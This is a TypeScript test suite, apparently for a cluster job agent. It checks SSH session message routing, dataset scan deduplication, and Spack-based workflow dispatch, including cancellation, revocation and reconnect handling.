          value: create(SshOpenSchema, {
            sessionId: "s1",
            host: "login01",
            port: 22,
            username: "alice",
            auth: create(SshAuthSchema, { password: "pw" }),
          }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "sshData",
          value: create(SshDataSchema, { sessionId: "s1", data: new TextEncoder().encode("hi") }),
        },
      }),
    ];
    const { client } = makeMockClient(serverMsgs, 200);

    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      sshHandlerFactory: (enqueue) =>
        new SshHandler({ enqueue, logger: silent, ssh2Factory: factory }),
    });
    activeStreams.push(stream);

    void stream.start();
    await settle(20);
    // SshData buffered before the channel opened; firing `ready` flushes it.
    fireReady();
    await settle(5);
    const flushed = writes.map((w) => (typeof w === "string" ? w : new TextDecoder().decode(w)));
    expect(flushed.join("")).toContain("hi");

    stream.stop();
  });

  test("routes a Server SshClose through to tear the session down", async () => {
    const { factory } = fakeSsh2Factory();
    let handler: SshHandler | undefined;

    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "sshOpen",
          value: create(SshOpenSchema, {
            sessionId: "s1",
            host: "login01",
            port: 22,
            username: "alice",
            auth: create(SshAuthSchema, { password: "pw" }),
          }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "sshClose",
          value: create(SshCloseSchema, { sessionId: "s1", reason: "client closed" }),
        },
      }),
    ];
    const { client } = makeMockClient(serverMsgs, 200);

    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      sshHandlerFactory: (enqueue) => {
        handler = new SshHandler({ enqueue, logger: silent, ssh2Factory: factory });
        return handler;
      },
    });
    activeStreams.push(stream);

    void stream.start();
    await settle(20);
    // The SshClose dispatch must reach handler.handleClose and free the session;
    // without it the session would linger until stop().
    expect(handler?.activeCount()).toBe(0);

    stream.stop();
  });

  test("scans a CP-local dataset once and replays the metadata-only result for duplicate requests", async () => {
    const request = create(ServerMessageSchema, {
      payload: {
        case: "dataScanRequest",
        value: create(DataScanRequestSchema, {
          requestId: "scan-1",
          importId: "import-1",
          assetId: "asset-1",
          versionId: "version-1",
          managedRootId: "root-1",
          relativePath: "cohort",
          providerOrgId: "provider-org",
        }),
      },
    });
    const registered = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
      },
    });
    const { client, sent } = makeMockClient([registered, request, request], 50);
    let scans = 0;
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      dataScanner: {
        scan: async (input) => {
          scans += 1;
          return {
            ...input,
            agentId: "agent-001",
            manifestDigest: "a".repeat(64),
            contentSha256: "b".repeat(64),
            totalSizeBytes: 6,
            format: "directory",
            files: [{ path: "sample.txt", sha256: "c".repeat(64), sizeBytes: 6 }],
            attestationAlgorithm: "rsa-sha256",
            attestationKeyId: "key-1",
            attestationSignature: "signature",
            scannedAtUnixMs: 1,
          };
        },
      },
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(20);
    stream.stop();
    await runPromise;

    const results = sent.filter(
      (message) => (message as { payload?: { case?: string } }).payload?.case === "dataScanResult",
    ) as Array<{
      payload: {
        value: { providerOrgId: string; files: Array<{ relativePath: string }> };
      };
    }>;
    expect(scans).toBe(1);
    expect(results).toHaveLength(2);
    expect(results[0]?.payload.value.files).toEqual([
      expect.objectContaining({ relativePath: "sample.txt" }),
    ]);
    expect(results[0]?.payload.value.providerOrgId).toBe("provider-org");
  });
});

describe("AgentStream workflow Spack dispatch", () => {
  const installed: InstalledSpec = {
    name: "hello",
    version: "1.0",
    spec: "hello@1.0",
    hash: "a".repeat(32),
  };
  const loadSuccess: SoftwareOperationOutcome = {
    outcome: "succeeded",
    stdout: "export PATH='/srv/kq/store/releases/hello/bin':\"$PATH\";\n",
    installed: [installed],
  };
  const intent = { spec: "hello@1.0", command: "hello 'two words'" };

  function dispatch(overrides: Parameters<typeof create<typeof DispatchJobSchema>>[1] = {}) {
    return create(ServerMessageSchema, {
      payload: {
        case: "dispatchJob",
        value: create(DispatchJobSchema, {
          jobId: "workflow-spack",
          name: "workflow spack",
          command: SPACK_EXECUTION_PLACEHOLDER,
          cpus: 1,
          memoryMb: 64n,
          dispatchEpoch: 1n,
          spackExecution: intent,
          ...overrides,
        }),
      },
    });
  }

  async function fixture(
    load: SpackManager["runSoftwareOperation"] = async () => loadSuccess,
    overrides: Partial<AgentStreamDeps> = {},
  ) {
    const db = createSqliteDb(":memory:");
    const inboundAcks = new InboundAcks(db);
    const tombstones = new JobRevocationTombstones(db);
    const spackManager = await SpackManager.bootstrap({
      requireServerMaterials: true,
      spawner: { run: async () => ({ exitCode: 0, stdout: "1.0.0", stderr: "" }) },
    });
    spackManager.runSoftwareOperation = load;
    const submitted: JobSpec[] = [];
    const reports: JobStatusReport[] = [];
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async (spec) => {
          submitted.push(spec);
          return { schedulerJobId: "scheduler-spack" };
        },
      }),
      agentId: "spack-agent",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      inboundAcks,
      revocationTombstones: tombstones,
      installedSoftware: [installed],
      spackManager,
      spackActivationSpawner: {
        run: async () => ({ exitCode: 0, stdout: "", stderr: "" }),
      },
      softwareOperationShutdownTimeoutMs: 50,
      ...overrides,
    });
    stream.enqueueStatusUpdate = async (report) => {
      reports.push(report);
    };
    activeStreams.push(stream);
    const harness = stream as unknown as {
      pendingSpackPreparations: Set<Promise<void>>;
      pendingSpackLoadCleanups: Set<Promise<void>>;
      softwareOperationQueue: Promise<void>;
      installedSoftware: InstalledSpec[];
      pool: { submit: (spec: JobSpec) => Promise<{ jobId: string }> };
    };
    return {
      stream,
      inboundAcks,
      tombstones,
      submitted,
      reports,
      harness,
      drain: () => Promise.all([...harness.pendingSpackPreparations]),
    };
  }

  test("pending load survives reconnect without false failure or duplicate submit", async () => {
    const closeFirst = Promise.withResolvers<void>();
    const finishLoad = Promise.withResolvers<SoftwareOperationOutcome>();
    const reconnect = makeReplayReconnectClient(
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true }),
        },
      }),
      closeFirst.promise,
    );
    let loads = 0;
    const f = await fixture(
      async () => {
        loads++;
        return finishLoad.promise;
      },
      {
        clientFactory: reconnect.clientFactory,
        heartbeatIntervalMs: 5,
        reconnectBackoffMs: 1,
        readGpuMetrics: async () => [],
        readDiskUsedPercent: async () => 0,
        readSchedulerQueueDepth: async () => 0,
      },
    );
    // Preserve the real outbound path: reconnect replay does not use the fixture's report spy.
    f.stream.enqueueStatusUpdate = AgentStream.prototype.enqueueStatusUpdate.bind(f.stream);
    const sent = (connection: number) =>
      (reconnect.sentByConnection[connection] ?? []) as AgentMessage[];
    const statuses = () =>
      reconnect.sentByConnection.flatMap((messages) =>
        (messages as AgentMessage[]).flatMap((message) =>
          message.payload.case === "jobStatus" && message.payload.value.jobId === "workflow-spack"
            ? [message.payload.value.status]
            : [],
        ),
      );
    const running = f.stream.start();
    try {
      await waitForCondition(() => sent(0).some((m) => m.payload.case === "heartbeat"));
      await deliverServerMessage(f.stream, dispatch());
      await waitForCondition(() => loads === 1);
      expect(await f.inboundAcks.pendingInbound()).toHaveLength(1);

      closeFirst.resolve();
      await waitForCondition(() => reconnect.registrationProcessed.has(1));
      // A heartbeat is emitted only after this connection has finished inbound replay.
      await waitForCondition(() => sent(1).some((m) => m.payload.case === "heartbeat"));
      expect(reconnect.connectionCount()).toBe(2);
      expect(statuses()).toEqual([]);
      expect(await f.inboundAcks.pendingInbound()).toHaveLength(1);
      expect(f.submitted).toEqual([]);

      await deliverServerMessage(f.stream, dispatch());
      await settle();
      expect(loads).toBe(1);
      finishLoad.resolve(loadSuccess);
      await f.drain();
      await waitForCondition(() => statuses().includes(ProtoJobStatus.COMPLETED));
      expect(statuses()).not.toContain(ProtoJobStatus.FAILED);
      expect(f.submitted).toHaveLength(1);
      expect(loads).toBe(1);
      expect(await f.inboundAcks.pendingInbound()).toEqual([]);
    } finally {
      closeFirst.resolve();
      finishLoad.resolve(loadSuccess);
      await f.stream.stop();
      await running;
      await Promise.all(reconnect.requestDoneByConnection);
    }
  });

  test.each(["mock", "store"] as const)("serializes %s preparation", async (mode) => {
    const releaseFirstLoad = Promise.withResolvers<void>();
    const releaseFirstSyntax = Promise.withResolvers<void>();
    const calls: string[] = [];
    let active = 0;
    let maxActive = 0;
    let syntaxChecks = 0;
    const root =
      mode === "store"
        ? await realpath(await mkdtemp(join(tmpdir(), "kq-stream-spack-")))
        : undefined;
    const store = root ? new SpackInstallStore(join(root, "store")) : undefined;
    await store?.initialize();
    const f = await fixture(
      async (_action, spec) => {
        calls.push(spec);
        active++;
        maxActive = Math.max(maxActive, active);
        const load = async () => {
          if (spec === "hello@1.0") await releaseFirstLoad.promise;
          return loadSuccess;
        };
        try {
          return store ? await store.withLock(load) : await load();
        } finally {
          active--;
        }
      },
      {
        spackActivationSpawner: {
          run: async () => {
            syntaxChecks++;
            if (syntaxChecks === 1) await releaseFirstSyntax.promise;
            return { exitCode: 0, stdout: "", stderr: "" };
          },
        },
      },
    );
    try {
      await deliverServerMessage(f.stream, dispatch());
      await waitForCondition(() => calls.length === 1);
      await deliverServerMessage(
        f.stream,
        dispatch({
          jobId: "workflow-spack-second",
          spackExecution: { spec: "hello@2.0", command: "hello second" },
        }),
      );
      await settle();
      expect(calls).toEqual(["hello@1.0"]);
      expect(maxActive).toBe(1);
      expect(f.submitted).toEqual([]);

      releaseFirstLoad.resolve();
      await waitForCondition(() => syntaxChecks === 1);
      await settle();
      // The queue owns the whole preparation, not just the manager's load promise.
      expect(calls).toEqual(["hello@1.0"]);
      expect(active).toBe(0);
      releaseFirstSyntax.resolve();
      await f.drain();
      await waitForCondition(() => f.submitted.length === 2);
      expect(calls).toEqual(["hello@1.0", "hello@2.0"]);
      expect(maxActive).toBe(1);
      expect(syntaxChecks).toBe(2);
      expect(f.reports.some((report) => report.status === "failed")).toBe(false);
    } finally {
      releaseFirstLoad.resolve();
      releaseFirstSyntax.resolve();
      await f.drain();
      await f.harness.softwareOperationQueue;
      await f.stream.stop();
      if (root) await rm(root, { recursive: true, force: true });
    }
  });

  test.each(["software-first", "workflow-first"] as const)("%s queue", async (order) => {
    const releaseFirst = Promise.withResolvers<void>();
    const releaseSyntax = Promise.withResolvers<void>();
    const calls: string[] = [];
    let active = 0;
    let maxActive = 0;
    let syntaxEntered = false;
    const f = await fixture(
      async (_action, spec) => {
        calls.push(spec);
        active++;
        maxActive = Math.max(maxActive, active);
        try {
          if (calls.length === 1) await releaseFirst.promise;
          return loadSuccess;
        } finally {
          active--;
        }
      },
      {
        spackActivationSpawner: {
          run: async () => {
            syntaxEntered = true;
            if (order === "workflow-first") await releaseSyntax.promise;
            return { exitCode: 0, stdout: "", stderr: "" };
          },
        },
      },
    );
    const software = create(ServerMessageSchema, {
      payload: {
        case: "softwareOperationRequest",
        value: create(SoftwareOperationRequestSchema, {
          operationId: "software-queued-with-workflow",
          action: SoftwareOperationAction.LOAD,
          spec: "software-only@1.0",
        }),
      },
    });
    const expected =
      order === "software-first"
        ? ["software-only@1.0", "hello@1.0"]
        : ["hello@1.0", "software-only@1.0"];
    try {
      await deliverServerMessage(f.stream, order === "software-first" ? software : dispatch());
      await waitForCondition(() => calls.length === 1);
      await deliverServerMessage(f.stream, order === "software-first" ? dispatch() : software);
      await settle();
      expect(calls).toEqual([expected[0]]);
      expect(maxActive).toBe(1);
      releaseFirst.resolve();
      if (order === "workflow-first") {
        await waitForCondition(() => syntaxEntered);
        await settle();
        expect(calls).toEqual(["hello@1.0"]);
        releaseSyntax.resolve();
      }
      await f.drain();
      await f.harness.softwareOperationQueue;
      await waitForCondition(() => f.submitted.length === 1);
      expect(calls).toEqual(expected);
      expect(maxActive).toBe(1);
      expect(active).toBe(0);
      expect(f.reports.some((report) => report.status === "failed")).toBe(false);
    } finally {
      releaseFirst.resolve();
      releaseSyntax.resolve();
      await f.drain();
      await f.harness.softwareOperationQueue;
      await f.stream.stop();
    }
  });

  test("cancelled load holds the queue until cleanup finishes before the next load", async () => {
    const releaseCleanup = Promise.withResolvers<void>();
    const calls: string[] = [];
    const events: string[] = [];
    let firstSignal: AbortSignal | undefined;
    let active = 0;
    let maxActive = 0;
    const f = await fixture(async (_action, spec, _materials, signal) => {
      calls.push(spec);
      active++;
      maxActive = Math.max(maxActive, active);
      try {
        if (spec === "hello@1.0") {
          firstSignal = signal;
          await releaseCleanup.promise;
          events.push("first-cleanup-finished");
          return {
            outcome: "failed",
            exitCode: 1,
            stderr: "cancelled after cleanup",
            invalidatedHashes: [installed.hash],
          };
        }
        events.push("second-load-entered");
        expect(f.harness.installedSoftware).toEqual([]);
        return loadSuccess;
      } finally {
        active--;
      }
    });
    try {
      await deliverServerMessage(f.stream, dispatch());
      await waitForCondition(() => calls.length === 1);
      await deliverServerMessage(
        f.stream,
        dispatch({
          jobId: "workflow-spack-second",
          spackExecution: { spec: "hello@2.0", command: "hello second" },
        }),
      );
      await deliverServerMessage(f.stream, cancelJobMessage("workflow-spack", 1));
      await waitForCondition(() =>
        f.reports.some(
          (report) => report.jobId === "workflow-spack" && report.status === "cancelled",
        ),
      );
      await settle();
      expect(firstSignal?.aborted).toBe(true);
      expect(calls).toEqual(["hello@1.0"]);
      expect(events).toEqual([]);
      expect(active).toBe(1);
      expect(f.submitted).toEqual([]);

      releaseCleanup.resolve();
      await f.drain();
      await f.harness.softwareOperationQueue;
      await waitForCondition(() => f.submitted.length === 1);
      expect(events).toEqual(["first-cleanup-finished", "second-load-entered"]);
      expect(calls).toEqual(["hello@1.0", "hello@2.0"]);
      expect(maxActive).toBe(1);
      expect(f.submitted.map((spec) => spec.jobId)).toEqual(["workflow-spack-second"]);
      expect(f.reports.some((report) => report.status === "failed")).toBe(false);
    } finally {
      releaseCleanup.resolve();
      await f.drain();
      await f.harness.softwareOperationQueue;
      await f.stream.stop();
    }
  });

  test("durably records intent before loading and submits the managed environment command", async () => {
    let sawPending = false;
    const f = await fixture(async (action, spec, materials, signal) => {
      expect(action).toBe("load");
      expect(spec).toBe(intent.spec);
      expect(materials).toBeUndefined();
      expect(signal?.aborted).toBe(false);
      const pending = await f.inboundAcks.pendingInbound();
      expect(pending[0]?.payload.command).toBe("exit 125");
      expect(pending[0]?.payload.spackExecution).toEqual(intent);
      sawPending = true;
      return loadSuccess;
    });
    await deliverServerMessage(f.stream, dispatch());
    await f.drain();
    await waitForCondition(() => f.submitted.length === 1);
    expect(sawPending).toBe(true);
    expect(f.submitted[0]?.command).toContain("/srv/kq/store/releases/hello/bin");
    expect(f.submitted[0]?.command).toContain("set -e");
    expect(f.submitted[0]?.command.endsWith(intent.command)).toBe(true);
    expect(f.submitted[0]?.command).not.toContain("spack load");
    await waitForCondition(() => f.reports.some((report) => report.status === "completed"));
    expect(await f.inboundAcks.pendingInbound()).toEqual([]);
  });

  test.each([
    "failed",
    "rejected",
    "throws",
    "empty",
    "bad-shell",
    "unavailable",
  ] as const)("rejects %s activation without submission", async (mode) => {
    const f = await fixture(
      async () => {
        if (mode === "throws") throw new Error("private runtime diagnostic");
        if (mode === "rejected") {
          return { outcome: "rejected", reason: "private non-root or policy rejection" };
        }
        if (mode === "empty") return { ...loadSuccess, stdout: "" };
        if (mode === "bad-shell") return { ...loadSuccess, stdout: "export PATH='" };
        return { outcome: "failed", exitCode: 9, stderr: "private managed installation path" };
      },
      {
        ...(mode === "unavailable" ? { spackManager: undefined } : {}),
        spackActivationSpawner: {
          run: async () => ({
            exitCode: mode === "bad-shell" ? 2 : 0,
            stdout: "",
            stderr: "private shell diagnostic",
          }),
        },
      },
    );
    let poolCalls = 0;
    f.harness.pool.submit = async (spec) => {
      poolCalls++;
      return { jobId: spec.jobId };
    };
    await deliverServerMessage(f.stream, dispatch());
    await f.drain();
    expect(poolCalls).toBe(0);
    expect(f.submitted).toEqual([]);
    expect(f.reports).toEqual([
      { jobId: "workflow-spack", status: "failed", message: SPACK_ACTIVATION_FAILURE },
    ]);
    expect(await f.inboundAcks.pendingInbound()).toEqual([]);
  });

  test.each(["placeholder", "shape", "sandbox"] as const)("rejects %s", async (mode) => {
    let loads = 0;
    const f = await fixture(async () => {
      loads++;
      return loadSuccess;
    });
    await deliverServerMessage(
      f.stream,
      dispatch(
        mode === "placeholder"
          ? { command: "hello" }
          : mode === "shape"
            ? { spackExecution: { spec: "", command: "hello" } }
            : { sandboxExecution: create(SandboxExecutionSchema, {}) },
      ),
    );
    await f.drain();
    expect(loads).toBe(0);
    expect(f.submitted).toEqual([]);
    expect(f.reports[0]?.message).toBe(SPACK_ACTIVATION_FAILURE);
  });

  test("withdraws invalidated managed inventory even though the job fails", async () => {
    const f = await fixture(async () => ({
      outcome: "failed",
      exitCode: 1,
      stderr: "private failed managed verification",
      invalidatedHashes: [installed.hash],
    }));
    await deliverServerMessage(f.stream, dispatch());
    await f.drain();
    expect(f.harness.installedSoftware).toEqual([]);
    expect(f.submitted).toEqual([]);
    expect(f.reports[0]?.message).toBe(SPACK_ACTIVATION_FAILURE);
  });

  test("a revoked dispatch never starts loading", async () => {
    let loads = 0;
    const f = await fixture(async () => {
      loads++;
      return loadSuccess;
    });
    await f.tombstones.record("workflow-spack", 1);
    await deliverServerMessage(f.stream, dispatch());
    await f.drain();
    expect(loads).toBe(0);
    expect(f.submitted).toEqual([]);
  });

  test("rechecks revocation after load before submitting to the pool", async () => {
    const f = await fixture(async () => {
      await f.tombstones.record("workflow-spack", 1);
      return loadSuccess;
    });
    await deliverServerMessage(f.stream, dispatch());
    await f.drain();
    expect(f.submitted).toEqual([]);
    expect(f.reports).toEqual([{ jobId: "workflow-spack", status: "cancelled" }]);
  });

  test.each(["cancel", "shutdown", "timeout"] as const)("%s blocks late submit", async (mode) => {
    let started: () => void = () => {};
    const loading = new Promise<void>((resolve) => {
      started = resolve;
    });
    let finish: (outcome: SoftwareOperationOutcome) => void = () => {};
    const loaded = new Promise<SoftwareOperationOutcome>((resolve) => {
      finish = resolve;
    });
    let loadSignal: AbortSignal | undefined;
    const f = await fixture(
      async (_action, _spec, _materials, signal) => {
        loadSignal = signal;
        started();
        return loaded;
      },
      mode === "timeout"
        ? { spackActivationTimeoutMs: 1 }
        : mode === "shutdown"
          ? { softwareOperationShutdownTimeoutMs: 2_000 }
          : {},
    );
    await deliverServerMessage(f.stream, dispatch());
    await loading;
    let stopping: Promise<void> | undefined;
    let stopped = false;
    if (mode === "cancel") {
      await deliverServerMessage(f.stream, cancelJobMessage("workflow-spack", 1));
    } else if (mode === "shutdown") {
      stopping = f.stream.stop().then(() => {
        stopped = true;
      });
    }
    await f.drain();
    // Let stop() settle if it incorrectly ignores the still-pending load cleanup.
    await settle();
    expect(loadSignal?.aborted).toBe(true);
    expect(f.harness.pendingSpackLoadCleanups.size).toBe(1);
    if (mode === "shutdown") expect(stopped).toBe(false);
    finish(loadSuccess);
    await loaded;
    await stopping;
    await settle();
    expect(f.harness.pendingSpackLoadCleanups.size).toBe(0);
    expect(f.submitted).toEqual([]);
    if (mode === "shutdown") {
      expect(stopped).toBe(true);
      expect(f.reports).toEqual([]);
      expect((await f.inboundAcks.pendingInbound())[0]?.payload.spackExecution).toEqual(intent);
    } else {
      expect(f.reports[0]?.status).toBe(mode === "cancel" ? "cancelled" : "failed");
    }
  });

  test("checks the epoch again after asynchronous work-root preparation", async () => {
    const f = await fixture(undefined, {
      prepareJobWorkRoot: async () => {
        await f.tombstones.record("workflow-spack", 1);
        return "/managed/workflow-spack";
      },
      removeJobWorkRoot: async () => {},
    });
    await deliverServerMessage(
      f.stream,
      dispatch({ expectedOutputs: [{ descriptor: "log", path: "log", isBatch: false }] }),
    );
    await f.drain();
    expect(f.submitted).toEqual([]);
    expect(f.reports[0]?.status).toBe("cancelled");
  });
});

describe("jobStatusReportToProto", () => {
  test("maps the node + pending reason onto the proto message", () => {
    const report: JobStatusReport = {
      jobId: "j-1",
      status: "running",
      schedulerJobId: "67890",
      node: "node[001-004]",
      reason: "None",
      failureCode: "QUEUE_NOT_ACCEPTING",
      workingDir: "/managed/jobs/j-1",
    };
    const msg = jobStatusReportToProto(report);
    expect(msg.payload.case).toBe("jobStatus");
    const value = (
      msg.payload as {
        value: { node: string; reason: string; failureCode: string; workingDir: string };
      }
    ).value;
    expect(value.node).toBe("node[001-004]");
    expect(value.reason).toBe("None");
    expect(value.failureCode).toBe("QUEUE_NOT_ACCEPTING");
    expect(value.workingDir).toBe("/managed/jobs/j-1");
  });

  test("defaults node/reason to empty strings when the report omits them", () => {
    const msg = jobStatusReportToProto({ jobId: "j-2", status: "queued" });
    const value = (msg.payload as { value: { node: string; reason: string } }).value;
    expect(value.node).toBe("");
    expect(value.reason).toBe("");
  });

  test("maps cancellation to the terminal proto status", () => {
    const msg = jobStatusReportToProto({ jobId: "j-cancelled", status: "cancelled" });
    const value = (msg.payload as { value: { status: ProtoJobStatus } }).value;
    expect(value.status).toBe(ProtoJobStatus.CANCELLED);
  });
});
